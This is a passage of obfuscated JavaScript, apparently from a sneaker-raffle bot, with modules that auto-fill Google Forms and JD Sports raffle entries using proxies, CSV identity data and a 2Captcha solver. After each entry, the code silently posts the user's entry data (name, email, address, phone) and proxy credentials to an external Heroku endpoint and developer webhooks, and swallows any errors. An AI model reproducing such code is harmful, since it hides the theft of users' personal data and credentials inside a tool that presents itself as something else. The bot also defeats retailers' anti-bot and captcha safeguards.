                        let _0x432fa1 = _0x356539[_0x153b24];
                        try {
                            prxdata = {
                                'username': _0x2e53d0['replace']('#', ''),
                                'module': _0x1d2527['name'],
                                'entrydata': JSON['stringify'](_0x432fa1),
                                'proxy': '' + _0x2330aa[_0x153b24]
                            };
                            var _0x1af669 = JSON['stringify'](prxdata);
                            let _0x9de1b2 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x1af669, _0x9de1b2);
                        } catch (_0x51446a) {
                        }
                        if (_0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '')
                            try {
                                await _0x15c654(_0x79d23a['webhook'], _0x315beb['succesDEVMSG']);
                            } catch {
                            }
                        await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x315beb['succesDEVMSG']), await _0x289b0b(0xc8);
                        try {
                            await _0x15c654(_0x1d7baa, _0x315beb['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x43f9b5) {
                        console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20' + _0x43f9b5), _0x223ae3 = '' + _0x43f9b5;
                        var _0x5aab4e = await _0x117512(_0x356539[_0x153b24], _0x1d2527, 'dev', !![], _0x223ae3);
                        _0x315beb['errorDEV'] = { 'embeds': [_0x5aab4e] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x315beb['errorDEV']), await _0x15c654(_0x34ab86, _0x315beb['errorDEV']), _0x21adea = 'yes';
                    } finally {
                        _0x54c314['close']();
                        if (_0x21adea == 'yes' && _0x5f013e != 0x5) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5f013e + '\x20/\x205)')), _0x153b24 = _0x153b24 - 0x1, _0x5f013e = _0x5f013e + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x2f142d, _0x4ec517, _0x3af579) {
                let _0x41402b = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x3126e3 = _0x457b0a['readFileSync']('forms/templates.json', 'utf-8');
                let _0x39904b = JSON['parse'](_0x3126e3), _0x2a9578 = ![];
                if (_0x39904b['length'] != 0x0) {
                    let _0x2e3f24 = 0x0;
                    for (template of _0x39904b) {
                        if (template['Url'] == _0x4ec517[0x0]['Url']) {
                            _0x2a9578 = !![], console['log'](_0x1ac777['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x1ac777['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x1ac777['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x48ec8b() {
                                let _0x49e896 = await _0x4bf4a7['get']('answer');
                                if (_0x49e896['answer']['toLowerCase']() != 'y' && _0x49e896['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x48ec8b();
                                return _0x49e896['answer']['toLowerCase']();
                            }
                            if (await _0x48ec8b() == 'n') {
                                _0x39904b['splice'](_0x2e3f24, 0x1), console['clear']();
                                break;
                            }
                            _0x41402b = template, console['clear']();
                            break;
                        }
                        _0x2e3f24++;
                    }
                }
                let _0x3a2a96 = 0x0, _0x23b058 = 0x0;
                function _0x23a67a(_0x30968a) {
                    console['log'](_0x3d201d() + '\x20[' + _0x2f142d['name'] + ']\x20Task\x20' + (_0x53c542 + 0x1) + '\x20:\x20' + _0x30968a);
                }
                var _0x1ce62a = 0x0;
                for (key in _0x41402b) {
                    if (key['includes']('custom'))
                        _0x3a2a96++;
                    if (key['includes']('Select'))
                        _0x23b058++;
                }
                for (var _0x53c542 = 0x0; _0x53c542 < _0x4ec517['length']; _0x53c542++) {
                    _0x41402b['Url'] = _0x4ec517[_0x53c542]['Url'];
                    let _0xdece82 = ![];
                    if (_0x39904b['length'] != 0x0)
                        for (template of _0x39904b) {
                            if (template['Url'] == _0x4ec517[_0x53c542]['Url']) {
                                _0x41402b = template, _0xdece82 = !![], _0x23a67a('Found\x20Template');
                                break;
                            }
                        }
                    var _0x5eceea;
                    if (_0x5588bc != 'yes') {
                        if (!_0x5588bc)
                            var _0x5588bc = '';
                        else
                            _0x5588bc = '';
                        _0x1ce62a = 0x0;
                    }
                    try {
                        await _0x5af4d5(_0x4ec517, _0x53c542);
                    } catch {
                        _0x5588bc = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x79d23a['useRandomProxy'] = ![])
                        var _0x3c59b1 = _0x3af579[_0x53c542]['split'](':');
                    else
                        var _0xb1de37 = Math['round'](Math['random']() * (_0x3af579['length'] - 0x1)), _0x3c59b1 = _0x3af579[_0xb1de37]['split'](':');
                    var _0x3a099d;
                    if (_0x3c59b1['length'] == 0x1)
                        try {
                            _0x3a099d = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a099d = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x3a099d = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c59b1[0x0] + ':' + _0x3c59b1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3a099d = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c59b1[0x0] + ':' + _0x3c59b1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0xbf9c2c = { 'first': ![] };
                        const _0x33dea9 = await _0x3a099d['newPage']();
                        if (_0x3c59b1['length'] != 0x0)
                            await _0x33dea9['authenticate']({
                                'username': '' + _0x3c59b1[0x2],
                                'password': '' + _0x3c59b1[0x3]
                            });
                        _0x23a67a('Getting\x20Session');
                        let _0xe767e2 = ![];
                        try {
                            await _0x33dea9['goto'](_0x4ec517[_0x53c542]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x289b0b(0xbb8);
                        } catch (_0x2c60b8) {
                            throw new Error(_0x2c60b8);
                        }
                        const _0x3130d2 = await _0x33dea9['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x3130d2) {
                            _0x23a67a('Login\x20Detected');
                            let _0x389c13 = await _0x3130d2['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x389c13['click'](), _0xe767e2 = !![];
                        }
                        let _0x3556ed = await _0x33dea9['$']('#identifierId');
                        _0x3556ed && (_0xe767e2 = !![]);
                        await _0x33dea9['waitForSelector']('.teQAzf');
                        async function _0x5732ab() {
                            let _0x192942 = await _0x33dea9['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x192942) {
                                let _0x3d2813;
                                try {
                                    _0x3d2813 = await question['$eval']('.M7eMe', _0x525c13 => _0x525c13['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x3a2a96 != 0x0) {
                                    let _0x42c036 = ![];
                                    for (let _0x23491b = 0x0; _0x23491b < _0x3a2a96; _0x23491b++) {
                                        if (_0x3d2813 == _0x41402b['custom' + _0x23491b]['title']) {
                                            _0x23a67a('Custom\x20Selector\x20found;\x20' + _0x3d2813);
                                            let _0x217d4b = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x21f0cf = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x217d4b)
                                                await _0x217d4b['type']('' + _0x41402b['custom' + _0x23491b]['answer']);
                                            else
                                                _0x21f0cf && await _0x21f0cf['type']('' + _0x41402b['custom' + _0x23491b]['answer']);
                                            _0x42c036 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x42c036) {
                                        await _0x289b0b(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x23b058 != 0x0) {
                                    let _0x92a0a8 = ![];
                                    for (let _0x3be6f9 = 0x0; _0x3be6f9 < _0x23b058; _0x3be6f9++) {
                                        if (_0x3d2813 == _0x41402b[_0x3be6f9 + 'Select']['title']) {
                                            _0x23a67a('Custom\x20Selector\x20found;\x20' + _0x3d2813);
                                            let _0x1d3cc8 = await question['$$']('.ulDsOb');
                                            for (opt of _0x41402b[_0x3be6f9 + 'Select']['answer']) {
                                                let _0x1b9878 = await _0x1d3cc8[opt]['$']('span');
                                                await _0x1b9878['click']();
                                            }
                                            _0x92a0a8 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x92a0a8) {
                                        await _0x289b0b(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x3d2813 == _0x41402b['0Select']['title']) {
                                        _0x23a67a('Custom\x20Selector\x20found;\x20' + _0x41402b['0Select']['title']);
                                        let _0x254f6e = await question['$$']('.ulDsOb'), _0x2b37b5 = await _0x254f6e[_0x41402b['0Select']['answer']];
                                        await _0x2b37b5['click']();
                                        continue;
                                    }
                                    if (_0x3d2813 == _0x41402b['1Select']['title']) {
                                        _0x23a67a('Custom\x20Selector\x20found;\x20' + _0x41402b['1Select']['title']);
                                        let _0x4dcb24 = await question['$$']('.ulDsOb'), _0x2e9209 = await _0x4dcb24[_0x41402b['1Select']['answer']];
                                        await _0x2e9209['click']();
                                        continue;
                                    }
                                    if (_0x3d2813 == _0x41402b['2Select']['title']) {
                                        _0x23a67a('Custom\x20Selector\x20found;\x20' + _0x41402b['2Select']['title']);
                                        let _0x12bdf3 = await question['$$']('.ulDsOb'), _0x9af945 = await _0x12bdf3[_0x41402b['2Select']['answer']];
                                        await _0x9af945['click']();
                                        continue;
                                    }
                                } catch (_0x212894) {
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('mail') && !_0x3d2813['toLowerCase']()['includes']('agree') || _0x3d2813 == _0x41402b['Email']) {
                                    _0x23a67a('Mail\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x5ca47b = await question['$']('input');
                                    !_0x5ca47b && (_0x5ca47b = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x5ca47b['type'](_0x4ec517[_0x53c542]['Email']), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('first') || _0x3d2813['toLowerCase']() == 'name' || _0x3d2813['toLowerCase']() == 'name\x20' || _0x3d2813 == _0x41402b['FirstName']) {
                                    _0x23a67a('FirstName\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x3c9678 = await question['$']('input');
                                    !_0x3c9678 && (_0x3c9678 = await question['$']('textarea'));
                                    await _0x3c9678['type'](_0x4ec517[_0x53c542]['FirstName'] + '\x20'), await _0x289b0b(0x258);
                                    if (_0x3d2813 == _0x41402b['FirstName'])
                                        continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('last') || _0x3d2813['toLowerCase']()['includes']('surname') || _0x3d2813 == _0x41402b['LastName']) {
                                    _0x23a67a('LastName\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x5b6cbb = await question['$']('input');
                                    !_0x5b6cbb && (_0x5b6cbb = await question['$']('textarea'));
                                    await _0x5b6cbb['type'](_0x4ec517[_0x53c542]['LastName'] + '\x20'), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('address') && !_0x3d2813['toLowerCase']()['includes']('agree') || _0x3d2813 == _0x41402b['Address']) {
                                    _0x23a67a('Address\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x33d995 = await question['$']('input');
                                    !_0x33d995 && (_0x33d995 = await question['$']('textarea'));
                                    await _0x33d995['type'](_0x4ec517[_0x53c542]['Address1'] + '\x20' + _0x4ec517[_0x53c542]['HouseNumber'] + '\x20' + _0x4ec517[_0x53c542]['Address2']), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('phone') || _0x3d2813['toLowerCase']()['includes']('mobile') || _0x3d2813 == _0x41402b['Phone']) {
                                    _0x23a67a('Phone\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x3e8865 = await question['$']('input');
                                    !_0x3e8865 && (_0x3e8865 = await question['$']('textarea'));
                                    await _0x3e8865['type']('' + _0x4ec517[_0x53c542]['Phone']), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('country') || _0x3d2813 == _0x41402b['Country']) {
                                    let _0x2b5367 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x2b5367) {
                                        let _0xcc978a = ![], _0x199573 = await _0x2b5367['$$']('.ulDsOb');
                                        for (option of _0x199573) {
                                            let _0x5301f8 = await option['$']('span'), _0xc0959f = await option['$eval']('span', _0x57ffdb => _0x57ffdb['textContent']);
                                            if (_0xc0959f['toLowerCase']() == _0x4ec517[_0x53c542]['Country']['toLowerCase']()) {
                                                await _0x5301f8['click'](), _0xcc978a = !![];
                                                break;
                                            }
                                        }
                                        if (!_0xcc978a) {
                                            const _0x58c99d = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x58c99d['click'](), await _0x58c99d['type'](_0x4ec517[_0x53c542]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x23a67a('Country\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x11032b = await question['$']('input');
                                    !_0x11032b && (_0x11032b = await question['$']('textarea'));
                                    await _0x11032b['type']('' + _0x4ec517[_0x53c542]['Country']), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('city') || _0x3d2813 == _0x41402b['City']) {
                                    _0x23a67a('City\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x500776 = await question['$']('input');
                                    !_0x500776 && (_0x500776 = await question['$']('textarea'));
                                    await _0x500776['type']('' + _0x4ec517[_0x53c542]['City']), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('zip') || _0x3d2813 == _0x41402b['Zip']) {
                                    _0x23a67a('Zip\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x10d10e = await question['$']('input');
                                    !_0x10d10e && (_0x10d10e = await question['$']('textarea'));
                                    await _0x10d10e['type']('' + _0x4ec517[_0x53c542]['Zip']), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('insta') || _0x3d2813 == _0x41402b['Follower']) {
                                    _0x23a67a('Follower\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x27064a = await question['$']('input');
                                    !_0x27064a && (_0x27064a = await question['$']('textarea'));
                                    await _0x27064a['type']('' + _0x4ec517[_0x53c542]['Follower']), await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('size') || _0x3d2813 == _0x41402b['Size']) {
                                    _0x23a67a('Size\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x1176b2 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x1176b2) {
                                        let _0x29a729 = await _0x1176b2['$$']('.ulDsOb');
                                        if (_0x4ec517[_0x53c542]['Size']['toLowerCase']() == 'random') {
                                            var _0xc2ca19 = Math['round'](Math['random']() * (_0x29a729['length'] - 0x1));
                                            await _0x29a729[_0xc2ca19]['click']();
                                        } else
                                            for (size of _0x29a729) {
                                                let _0x1ccaa8 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x4cdb96 => _0x4cdb96['textContent']);
                                                if (_0x1ccaa8['toLowerCase']()['includes'](_0x4ec517[_0x53c542]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x58fa9c = await question['$']('.ry3kXd');
                                    if (_0x58fa9c) {
                                        await _0x58fa9c['click'](), await _0x289b0b(0x9c4);
                                        let _0x4c4f75 = await _0x33dea9['$']('div[jsname=\x22V68bde\x22]'), _0x2877d3 = await _0x4c4f75['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x2877d3) {
                                            let _0x250590 = await size['$eval']('.vRMGwf.oJeWuf', _0xa8bd52 => _0xa8bd52['textContent']), _0x4c5c7d = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x250590['toLowerCase']()['includes'](_0x4ec517[_0x53c542]['Size'])) {
                                                await _0x289b0b(0x190), await _0x4c5c7d['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('receive') || _0x3d2813['toLowerCase']()['includes']('method')) {
                                    _0x23a67a('Method\x20Selector\x20found;\x20' + _0x3d2813);
                                    let _0x30b2c5 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x30b2c5) {
                                        const _0x4e9aaa = await _0x30b2c5['$$']('.ulDsOb');
                                        for (size of _0x4e9aaa) {
                                            let _0x2d19a2 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x3438a8 => _0x3438a8['textContent']);
                                            if (_0x2d19a2['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x289b0b(0x258);
                                    continue;
                                }
                                if (_0x3d2813['toLowerCase']()['includes']('offers') || _0x3d2813['toLowerCase']()['includes']('agree')) {
                                    _0x23a67a('Authorization\x20Selector\x20found;\x20' + _0x3d2813);
                                    const _0x5b2b54 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x5b2b54) {
                                        const _0x1fd445 = await _0x5b2b54['$$']('.ulDsOb');
                                        for (size of _0x1fd445) {
                                            let _0x5f1389 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x523cfe => _0x523cfe['textContent']);
                                            if (_0x5f1389['toLowerCase']()['includes']('authorize') || _0x5f1389['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x289b0b(0x258);
                                    continue;
                                }
                                async function _0x9824b3() {
                                    let _0x4ad57f = await question['$']('.oyXaNc');
                                    if (_0x4ad57f) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1ac777['cyan'](_0x3d2813) + '\x0a');
                                        let _0x1d6658 = await question['$$']('.ulDsOb');
                                        for (let _0x484812 = 0x0; _0x484812 < _0x1d6658['length']; _0x484812++) {
                                            let _0x5757f5 = await _0x1d6658[_0x484812]['$eval']('span', _0x432348 => _0x432348['textContent']);
                                            console['log']('\x20(' + _0x484812 + ')\x20' + _0x5757f5);
                                        }
                                        console['log']();
                                        let _0x5434db = await _0x4bf4a7['get']('option'), _0x5b8c56 = await _0x1d6658[_0x5434db['option']]['$eval']('span', _0x4f85bb => _0x4f85bb['textContent']);
                                        _0x41402b[_0x23b058 + 'Select'] = {
                                            'title': _0x3d2813,
                                            'answer': _0x5434db['option']['split'](',')
                                        };
                                        let _0x249083 = await _0x1d6658[_0x5434db['option']]['$']('span');
                                        await _0x249083['click'](), _0x23b058++;
                                        return;
                                    }
                                    let _0x106142 = await question['$']('.Y6Myld');
                                    if (_0x106142) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1ac777['cyan'](_0x3d2813) + '\x0a');
                                        let _0x252582 = await question['$$']('.ulDsOb');
                                        for (let _0xbdeeed = 0x0; _0xbdeeed < _0x252582['length']; _0xbdeeed++) {
                                            let _0x3f9371 = await _0x252582[_0xbdeeed]['$eval']('span', _0x462f51 => _0x462f51['textContent']);
                                            console['log']('\x20(' + _0xbdeeed + ')\x20' + _0x3f9371);
                                        }
                                        console['log']();
                                        let _0x9f58a2 = await _0x4bf4a7['get']('option');
                                        _0x41402b[_0x23b058 + 'Select'] = {
                                            'title': _0x3d2813,
                                            'answer': _0x9f58a2['option']['split'](',')
                                        };
                                        for (opt of _0x41402b[_0x23b058 + 'Select']['answer']) {
                                            let _0x31b092 = await _0x252582[opt]['$']('span');
                                            await _0x31b092['click']();
                                        }
                                        _0x23b058++;
                                        return;
                                    }
                                    var _0x1de1df = 0x0;
                                    let _0x19c84d = Object['keys'](_0x41402b);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x1ac777['cyan'](_0x3d2813) + '\x0a');
                                    for (data of _0x19c84d) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x1de1df + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x1de1df + ')\x20' + data), _0x1de1df++;
                                    }
                                    console['log']('\x20(' + _0x19c84d['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x2e48dd = await _0x4bf4a7['get']('input');
                                    if (_0x2e48dd['input'] == _0x19c84d['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x1d2b9b = await _0x4bf4a7['get']('input');
                                        _0x41402b['custom' + _0x3a2a96] = {
                                            'title': _0x3d2813,
                                            'answer': '' + _0x1d2b9b['input']
                                        };
                                        let _0x723657 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x303669 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x723657)
                                            await _0x723657['type']('' + _0x41402b['custom' + _0x3a2a96]['answer']);
                                        else
                                            _0x303669 && await _0x303669['type']('' + _0x41402b['custom' + _0x3a2a96]['answer']);
                                        _0x3a2a96++;
                                        return;
                                    }
                                    _0x41402b['' + _0x19c84d[_0x2e48dd['input']]] = _0x3d2813;
                                    let _0x801c86 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x132a5e = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x801c86 && await _0x801c86['type']('' + _0x4ec517[_0x53c542]['' + _0x19c84d[_0x2e48dd['input']]]), _0x132a5e && await _0x132a5e['type']('' + _0x4ec517[_0x53c542]['' + _0x19c84d[_0x2e48dd['input']]]), await _0x289b0b(0x258);
                                }
                                await _0x9824b3(), await _0x289b0b(0x37a);
                            }
                            let _0x42093f = await _0x33dea9['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x42093f)
                                return await _0x42093f['click'](), await _0x33dea9['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x23a67a('New\x20Section'), _0x5732ab();
                        }
                        await _0x5732ab(), await _0x33dea9['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x33dea9['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x53c50d(_0x4ec517[_0x53c542], _0x2f142d), _0x5588bc = 'no';
                        var _0x19c08c = await _0x117512(_0x4ec517[_0x53c542], _0x2f142d, 'dev', ![]), _0x4729cb = await _0x117512(_0x4ec517[_0x53c542], _0x2f142d, 'pub', ![]);
                        let _0x2120f1 = _0x4ec517[_0x53c542];
                        try {
                            prxdata = {
                                'username': _0x2e53d0['replace']('#', ''),
                                'module': _0x2f142d['name'],
                                'entrydata': JSON['stringify'](_0x2120f1),
                                'proxy': '' + _0x3af579[_0x53c542]
                            };
                            var _0x4a9e69 = JSON['stringify'](prxdata);
                            let _0xe3ff5e = { 'headers': { 'content-type': 'application/json' } };
                            await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x4a9e69, _0xe3ff5e);
                        } catch (_0x58cd29) {
                        }
                        const _0x3adef4 = {
                            'succesDEVMSG': { 'embeds': [_0x19c08c] },
                            'succesPUBMSG': { 'embeds': [_0x4729cb] }
                        };
                        try {
                            _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x3adef4['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x3adef4['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0x3adef4['succesPUBMSG']);
                        } catch (_0x3cfaa7) {
                            console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x1e8c04[taskModule]['name'] + ']\x20Task\x20' + (_0x53c542 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3cfaa7));
                        }
                        console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x2f142d['name'] + ']\x20Task\x20' + (_0x53c542 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x3a2a96 != 0x0 || _0x23b058 != 0x0 && !_0xdece82) && (_0x39904b['push'](_0x41402b), _0x457b0a['writeFileSync']('forms/templates.json', JSON['stringify'](_0x39904b, null, 0x2), 'utf-8'));
                    } catch (_0x30d9ad) {
                        console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x2f142d['name'] + ']\x20Task\x20' + (_0x53c542 + 0x1) + '\x20:\x20' + _0x30d9ad)), _0x5eceea = '' + _0x30d9ad;
                        var _0x1444f6 = await _0x117512(_0x4ec517[_0x53c542], _0x2f142d, 'dev', !![], _0x5eceea);
                        let _0x5c9420 = {};
                        _0x5c9420['errorDEV'] = { 'embeds': [_0x1444f6] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x5c9420['errorDEV']), await _0x15c654(_0x34ab86, _0x5c9420['errorDEV']), _0x5588bc = 'yes';
                    } finally {
                        _0x3a099d && _0x3a099d['close']();
                        if (_0x5588bc == 'yes' && _0x1ce62a != 0x5) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x2f142d['name'] + ']\x20Task\x20' + (_0x53c542 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x1ce62a + 0x1) + '\x20/\x205)')), _0x53c542--, _0x1ce62a++;
                            continue;
                        }
                        if (_0x5588bc == 'yes' && _0x1ce62a == 0x5) {
                            _0x1ce62a = 0x0, _0x5588bc = 'no';
                            continue;
                        }
                        _0x23a67a('Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x349b1f, _0x2797f4, _0x43b372) {
                var _0x5b9031 = ![], _0x366bb8 = ![];
                if (_0x79d23a['captchaKey'] == '' || _0x79d23a['captchaKey'] == undefined)
                    return console['log'](_0x1ac777['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x79d23a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x74f3ce = 0x0; _0x74f3ce < _0x2797f4['length']; _0x74f3ce++) {
                    if (_0x3fcd35 != 'yes')
                        var _0x3fcd35 = '', _0x4381f5 = 0x0;
                    var _0x5d6d5e, _0x4e5289 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x2797f4[_0x74f3ce]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2797f4[_0x74f3ce]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x2e53d0
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x79d23a['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x492c9c
                            }
                        ]
                    }];
                    const _0x3fffdc = { 'embeds': _0x4e5289 };
                    _0x25b0b6(_0x349b1f['name'] + '\x20Task\x20' + (_0x74f3ce + 0x1) + '\x20/\x20' + _0x2797f4['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                    try {
                        await _0x5af4d5(_0x2797f4, _0x74f3ce);
                    } catch {
                        _0x3fcd35 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
